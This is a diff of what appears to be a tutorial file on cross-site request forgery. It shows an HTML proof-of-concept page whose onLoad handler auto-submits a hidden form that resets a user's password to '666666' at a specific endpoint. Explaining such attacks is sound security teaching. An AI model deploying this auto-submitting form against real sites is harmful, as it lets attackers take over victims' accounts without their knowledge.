@@ -75,9 +75,9 @@ http://www.aa.com/opt.php?id=135&act=del&name=Tom的链接
     <title>aa</title>
 </head>
 <body onLoad="document.forms[0].submit()">
-    <form action="http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286" method="post" name="test">
-           <input type="hidden" name="password" id="password" value="666666">
-           <input type="hidden" name="cpassword" id="conpassword" value="666666">
+    <form action="http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286" method="post">
+        <input type="hidden" name="password" id="password" value="666666">
+        <input type="hidden" name="cpassword" id="conpassword" value="666666">
     </form>
 </body>
 </html>
